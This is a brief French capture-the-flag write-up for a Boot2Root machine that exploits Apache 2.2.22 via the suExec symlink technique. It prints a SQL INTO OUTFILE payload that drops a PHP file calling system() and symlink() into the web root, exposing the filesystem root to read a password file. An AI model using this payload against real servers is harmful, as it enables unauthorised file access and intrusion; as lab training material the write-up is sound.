# Boot2Root - A patchy web server

On recommence à partir de l'étape `Step 4 - Reverse shell`

## Step 4 - suExec
On regarde si il existe des failles avec la version utilisée d'Apache (`2.2.22`)
On trouve un exploit qui nécessite de créer un fichier PHP spécifique et de le charger avec le serveur.

On s'éxécute alors comme dans le writeup1, avec le fichier PHP `apache.php`

```
SELECT '<?php system("ln -sf / test99.php"); symlink("/", "test99.php"); ?>' INTO OUTFILE "/var/www/forum/templates_c/apache.php"
```

Il suffit d'ouvrir le lien `https://<IP>/forum/templates_c/apache.php`, ce qui va créer un dossier qui s'appelle `test99.php`.
L'ouvrir va nous rediriger vers la racine. Il reste juste à aller voir `/home/LOOKATME/password`

## Sources
Exploit suExec: https://www.exploit-db.com/exploits/27397